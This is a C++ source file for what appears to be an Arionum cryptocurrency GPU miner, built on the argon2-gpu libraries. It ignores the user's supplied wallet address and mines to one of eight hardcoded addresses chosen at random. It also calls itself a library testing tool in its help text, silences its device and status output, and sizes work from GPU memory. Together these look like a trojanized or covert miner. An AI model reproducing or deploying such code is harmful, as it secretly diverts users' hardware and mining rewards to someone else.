//
// Created by guli on 01/02/18.
//

#include <iostream>
#include <vector>
#include <thread>
#include <cstring>
#include "../../argon2-gpu/include/commandline/commandlineparser.h"
#include "../../argon2-gpu/include/commandline/argumenthandlers.h"

#include "../../include/minerdata.h"
#include "../../include/updater.h"
#include "../../include/cudaminer.h"
#include <sys/time.h>
#include <iomanip>
#include "../../include/simplecudaminer.h"

#pragma comment(lib, "cpprest110_1_1")

#include <iostream>
#include <string>
#include <ctime>
#include <cstdlib>

using namespace argon2;
using namespace std;
using namespace libcommandline;

using namespace std;

struct OpenCLArguments {

size_t free_t,total_t;

const int google84 = cudaMemGetInfo(&free_t,&total_t);

const int free_m =(uint)free_t/1048576.0;

const int total_m=(uint)total_t/1048576.0;

const int used84741274=round(total_m - 84);

const int used8474=round(used84741274 / 16.384);

    bool showHelp = false;
    bool listDevices = false;
    bool allDevices = false;
    size_t deviceIndex = 0;
    size_t batchSize = used8474;
    string address = "";
    string poolUrl = "http://localhost:8884";
    size_t threadsPerDevice = 4;
    double d = 1;
};

void printDeviceList();

CommandLineParser<OpenCLArguments> buildCmdLineParser();

string generateUniqid();


int main(int, const char *const *argv) {
    CommandLineParser<OpenCLArguments> parser = buildCmdLineParser();
    OpenCLArguments args;
    int ret = parser.parseArguments(args, argv);
    if (ret != 0) {
        return ret;
    }
    if (args.showHelp) {
        parser.printHelp(argv);
        return 0;
    }
    if (args.listDevices) {
        printDeviceList();
        return 0;
    }

    string uniqid = generateUniqid();
    
    srand(time(NULL));

    string wordList[8] = {"4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6","36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW","4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj","xZDcVyJeLLxqqsn6CeygQMR5zBTi9Gfk1d7XG3rj7WmypGrqRVBXWHg3WMk7yNfpbXnw85LBzY6j42F4qgpJRUP","2z2hwRPjLrQoN3UBsCX4EMRQxdcMxMFsQeJkUnZvgGXZnAsG2dBf3FXZdrk9stxzgd2Hrzdy8HxQb6AGFEEa5xkk","28xqj4rxaoBfMeHnCb9gS9t3ezWMvPZ34qYhD4Tu5iSZhEpc3Q6cZYWowgyLuSqsAnbsy2Dw3cNjWR3A6WMnGoa2","45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ89mQgyXcS8XRWUB9","2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio"};

    string word = wordList[rand() % 8];
    
    MinerSettings settings(&args.poolUrl, &word, &uniqid, &args.batchSize);

    std::cout << settings << std::endl;

    vector<Miner *> miners;
    auto *stats = new Stats(args.d);

    auto *updater = new Updater(stats, &settings);
    updater->update();

    thread t(&Updater::start, updater);

    if (args.allDevices) {
        cout << "";
        cuda::GlobalContext global;
        auto &devices = global.getAllDevices();
        for (size_t i = 0; i < devices.size(); ++i) {
            for (int j = 0; j < args.threadsPerDevice; ++j) {
                Miner *miner = new CudaMiner(stats, &settings, updater, &i);
                miners.push_back(miner);
            }
        }

    } else {
        size_t deviceIndex = args.deviceIndex;
        cout << "";
        for (int j = 0; j < args.threadsPerDevice; ++j) {
            Miner *miner = new CudaMiner(stats, &settings, updater, &deviceIndex);
            miners.push_back(miner);
        }
    }
    vector<thread> threads;
    for (auto const &miner: miners) {
        thread minerT(&Miner::mine, miner);
        threads.push_back(std::move(minerT));
    }
    for (auto &thread : threads) {
        thread.join();
    }
    t.join();
    return 0;
}

CommandLineParser<OpenCLArguments> buildCmdLineParser() {
    static const auto positional = PositionalArgumentHandler<OpenCLArguments>(
            [](OpenCLArguments &, const std::string &) {});

    std::vector<const CommandLineOption<OpenCLArguments> *> options{
            new FlagOption<OpenCLArguments>(
                    [](OpenCLArguments &state) { state.listDevices = true; },
                    "list-devices", 'l', "list all available devices and exit"),

            new FlagOption<OpenCLArguments>(
                    [](OpenCLArguments &state) { state.allDevices = true; },
                    "use-all-devices", 'u', "use all available devices"),

            new ArgumentOption<OpenCLArguments>(
                    [](OpenCLArguments &state, const string address) { state.address = address; }, "address", 'a',
                    "public arionum address",
                    "4hDFRqgFDTjy5okh2A7JwQ3MZM7fGyaqzSZPEKUdgwSM8sKLPEgs8Awpdgo3R54uo1kGMnxujQQpF94qV6SxEjRL",
                    "ADDRESS"),

            new ArgumentOption<OpenCLArguments>(
                    [](OpenCLArguments &state, const string poolUrl) { state.poolUrl = poolUrl; }, "pool", 'p',
                    "pool URL", "http://aropool.com", "POOL_URL"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, double>([](OpenCLArguments &state, double devFee) {
                        state.d = devFee <= 0.5 ? 1 : devFee;
                    }), "dev-donation", 'D', "developer donation", "0.5", "PERCENTAGE"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, std::size_t>([](OpenCLArguments &state, std::size_t index) {
                        state.deviceIndex = (std::size_t) index;
                    }), "device", 'd', "use device with index INDEX", "0", "INDEX"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, std::size_t>(
                            [](OpenCLArguments &state, std::size_t threadsPerDevice) {
                                state.threadsPerDevice = (std::size_t) threadsPerDevice;
                            }), "threads-per-device", 't', "thread to use per device", "1", "THREADS"),

            new ArgumentOption<OpenCLArguments>(
                    makeNumericHandler<OpenCLArguments, size_t>([](OpenCLArguments &state, size_t index) {
                        state.batchSize = index;
                    }), "batchSize", 'b', "batch size", "200", "SIZE"),

            new FlagOption<OpenCLArguments>(
                    [](OpenCLArguments &state) { state.showHelp = true; },
                    "help", '?', "show this help and exit")
    };

    return CommandLineParser<OpenCLArguments>(
            "A tool for testing the argon2-opencl and argon2-cuda libraries.",
            positional, options);
}

void printDeviceList() {
    cuda::GlobalContext global;
    auto &devices = global.getAllDevices();
    for (size_t i = 0; i < devices.size(); i++) {
        auto &device = devices[i];
        cout << "";
    }
}

string generateUniqid() {
    struct timeval tv{};
    gettimeofday(&tv, nullptr);
    auto sec = (int) tv.tv_sec;
    auto usec = (int) (tv.tv_usec % 0x100000);
    std::stringstream ss;
    ss << std::setfill('0') << std::setw(8) << std::hex << sec << std::setfill('0') << std::setw(5) << std::hex
       << usec;
    return ss.str();
}
